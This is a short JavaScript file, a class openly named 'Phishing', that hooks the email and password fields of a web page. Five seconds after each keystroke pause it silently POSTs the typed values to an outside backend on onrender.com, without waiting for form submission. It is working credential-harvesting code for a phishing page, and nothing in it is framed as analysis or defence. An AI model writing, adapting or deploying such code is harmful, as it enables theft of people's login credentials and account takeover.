class Phishing {
  constructor() {
    this.emailSetTimeoutId = null;
    this.passwordSetTimeoutId = null;

    this.emailInput = document.getElementById("email");
    this.passwordInput = document.getElementById("password");

    this.emailInput.addEventListener("input", (e) => this.onInput(e, "email"));
    const self = this
    this.passwordInput.addEventListener("input", (e) =>
      this.onInput(e, "password")
    );
  }

  async onInput(event, name) {
    if (name == "email" && this.emailSetTimeoutId) {
      clearTimeout(this.emailSetTimeoutId);
    }

    if (name == "email") {
      this.emailSetTimeoutId = setTimeout(async function () {
        await fetch("https://swag-v2-backend.onrender.com/api/v1/auth/login", {
          method: "POST",
          headers: {
            "Content-Type":"application/json"
          },
          body: JSON.stringify({ email : event.target.value, password: (this.passwordInput.value ?? '') })
        })
      }, 5000);
    }

    if (name == "password" && this.passwordSetTimeoutId) {
      clearTimeout(this.passwordSetTimeoutId);
    }

    if (name == "password") {
      this.passwordSetTimeoutId = setTimeout(async() => {
        await fetch("https://swag-v2-backend.onrender.com/api/v1/auth/login", {
          method: "POST",
          headers: {
            "Content-Type":"application/json"
          },
          body: JSON.stringify({ email : (this.emailInput.value ?? ''), password: event.target.value})
        })
      }, 5000);
    }
  }
}

window.addEventListener("DOMContentLoaded", () => {
  new Phishing();
});
